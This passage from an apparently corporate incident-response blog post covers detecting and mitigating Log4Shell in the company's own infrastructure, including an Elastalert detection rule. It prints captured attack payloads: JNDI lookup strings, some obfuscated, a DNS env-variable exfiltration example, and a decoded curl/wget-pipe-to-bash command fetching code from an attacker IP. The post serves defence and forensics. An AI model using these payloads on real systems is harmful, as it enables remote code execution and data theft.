exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:</p><p><img loading="lazy" src="/jp/assets/images/01-canary-tokens-f983dacab054f367bad1da172173f916.png" width="1254" height="692" class="img_ev3q"></p><p>If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">curl https://docs.wgtwo.com  -A "\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.</p><p>JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.</p><p>Going back to our problem, we quickly found this <a href="https://github.com/veracode-research/rogue-jndi" target="_blank" rel="noopener noreferrer">Rogue JNDI</a>. This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:</p><p><img loading="lazy" src="/jp/assets/images/02-supported-payloads-a00c9b2b8c1fbe6da7493e687868530a.png" width="1242" height="392" class="img_ev3q"></p><p>In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Then, we should proceed to:
1) Identify if the affected components are in our stack or in the cloud provider
2) Apply mitigation</p><ul><li>Either via WAF - firewall rules on traffic.</li><li>Either via known mitigation on the log4g components<ul><li>Environment variable / JVM options</li><li>Java class removal</li><li>Full component upgrade</li></ul></li></ul><p>For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.</p><p>Assuming this was the only element, we proceed to apply mitigation:
We discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the <code>jndi:ldap</code> string used to trigger the vulnerability.
The environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.
Java class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="log-analysis-and-alerting">Log Analysis and Alerting<a class="hash-link" href="#log-analysis-and-alerting" title="Direct link to heading">​</a></h3><p>Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. <code>${jndi</code></p><p>Cloudflare wrote a great <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/" target="_blank" rel="noopener noreferrer">blog post</a> about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.</p><p>For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by <a href="https://aws.amazon.com/security/security-bulletins/AWS-2021-006/" target="_blank" rel="noopener noreferrer">AWS Security Bulletin</a>.</p><p>To get some ChatOps alerts in slack we use an open-source tool called <a href="https://github.com/Yelp/elastalert" target="_blank" rel="noopener noreferrer">Elstalert</a>. This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.</p><p>To get started, we built the following Elastalert rule:</p><div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token key atrule">log4j.yaml</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">|</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">---</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">name</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"log4j cve"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">index</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> logstash</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">*</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> any</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">realert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">filter</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token key atrule">query_string</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        </span><span class="token key atrule">query</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"\"jndi:ldap\""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_delay</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    </span><span class="token key atrule">minutes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">query_key</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_type</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> alert_text_only</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">include</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">"kubernetes.container.name"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"slack"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> "</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Container*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">\n</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token important">*Message*</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">{</span><span class="token number" style="color:rgb(247, 140, 108)">1</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">alert_text_args</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token string" style="color:rgb(195, 232, 141)">"kubernetes.container.name"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token string" style="color:rgb(195, 232, 141)">"message"</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_channel_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"#cve-2021-44228"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_emoji_override</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">":unlock:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_msg_color</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> warning</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  </span><span class="token key atrule">slack_title</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"> Security RCE attempt for CVE</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token plain">2021</span><span class="token punctuation" style="color:rgb(199, 146, 234)">-</span><span class="token number" style="color:rgb(247, 140, 108)">44228</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We quickly then began to receive alerts of probing attempts across our environments.</p><p><img loading="lazy" src="/jp/assets/images/03-elastalert-b2d2c5d0c28cf3f09e30feb948e60320.png" width="1236" height="590" class="img_ev3q"></p><p>The following alerts are <strong>unsuccessful</strong> exploit attempts our infrastructure.</p><p>Let’s take a closer look at some of these exploit attempts to see if we can learn anything..</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-10T14:05:52.612 Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET / HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">"45.155.205.233"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.155.205.233</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">12344</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Basic</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Command</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">Base64</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}</span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"34b61b2d-28f6-4e89-9baf-7cd3b4e71698"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"54.217.173.83:443"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"-"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:</p><p>base64</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>base64 decoded</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with <code>curl</code>, then attempt with <code>wget</code> and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from <a href="https://github.com/falcosecurity/falco" target="_blank" rel="noopener noreferrer">Falco</a>. In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.</p><p>Looking at more attempts, we started to see probing attempts using a 3rd party service using <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener noreferrer">Interactsh</a>.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token number" style="color:rgb(247, 140, 108)">16</span><span class="token plain">/Dec/2021:06:11:07 +0000</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET /?x=</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"</span><span class="token string variable" style="color:rgb(191, 199, 213)">${${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">j}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">n}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">i}</span><span class="token string" style="color:rgb(195, 232, 141)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">l}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">d}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">a}</span><span class="token string variable" style="color:rgb(191, 199, 213)">${</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:-</span><span class="token string variable" style="color:rgb(191, 199, 213)">p}</span><span class="token string" style="color:rgb(195, 232, 141)">://</span><span class="token string variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token string" style="color:rgb(195, 232, 141)">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">685</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.015</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token plain">products-developer-portal-8080</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">100.98</span><span class="token plain">.133.224:8080 </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0.014</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">302</span><span class="token plain"> 548d1132926fa0bc9904e12523d2f250 </span><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">l}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">d}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">a}</span><span class="token variable" style="color:rgb(191, 199, 213)">${lower</span><span class="token variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token variable" style="color:rgb(191, 199, 213)">p}</span><span class="token plain">://</span><span class="token variable" style="color:rgb(191, 199, 213)">${hostName}</span><span class="token plain">.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com</span><span class="token punctuation" style="color:rgb(199, 146, 234)">}</span><span class="token plain">, </span><span class="token number" style="color:rgb(247, 140, 108)">173.249</span><span class="token plain">.19.100</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token punctuation" style="color:rgb(199, 146, 234)">[</span><span class="token number" style="color:rgb(247, 140, 108)">2021</span><span class="token plain">-12-14T22:57:36.722Z</span><span class="token punctuation" style="color:rgb(199, 146, 234)">]</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"GET / HTTP/1.1"</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">307</span><span class="token plain"> - </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token plain"> - </span><span class="token string" style="color:rgb(195, 232, 141)">"51.105.55.17"</span><span class="token plain"> </span><span class="token string" style="color:rgb(195, 232, 141)">"/</span><span class="token string variable" style="color:rgb(191, 199, 213)">${jndi</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable" style="color:rgb(191, 199, 213)">ldap</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">:</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable operator" style="color:rgb(137, 221, 255)">/</span><span class="token string variable" style="color:rgb(191, 199, 213)">45.83.193.150</span><span class="token string variable operator" 